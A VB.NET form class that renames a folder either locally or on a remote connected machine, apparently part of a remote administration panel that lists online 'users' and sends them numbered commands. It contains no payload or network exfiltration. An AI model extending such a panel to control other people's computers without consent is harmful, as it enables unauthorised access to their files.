Imports System.IO

Public Class FilemanagerRenameFolder

    Private Sub ButtonCancelRename_Click(sender As Object, e As EventArgs) Handles ButtonCancelRename.Click
        Me.Close()
    End Sub

    Private Sub ButtonRename_Click(sender As Object, e As EventArgs) Handles ButtonRename.Click
        If Filemanager.RenameFolderLocal = False Then
            Dim Folderpath As String = Filemanager.TextBoxRemoteAdressBar.Text
            Dim NewName As String = TextBoxRenameFolder.Text
            If Main.ListViewMain.Items.Count > 0 Then
                If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                    Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            Else
                MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            End If
            Try
                Main.WriteData(Folderpath & "|||" & NewName)
                Main.WriteCommand(Main.SelectedUserID & "|27")
                Waiting.ShowDialog()
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Rename File")
            End Try

        Else
            Try
                FileIO.FileSystem.RenameDirectory(Filemanager.TextBoxLocalAdressBar.Text, TextBoxRenameFolder.Text)
            Catch ex As Exception
                MsgBox("Unable to rename directory.", MsgBoxStyle.Critical)
            End Try
        End If
    End Sub

End Class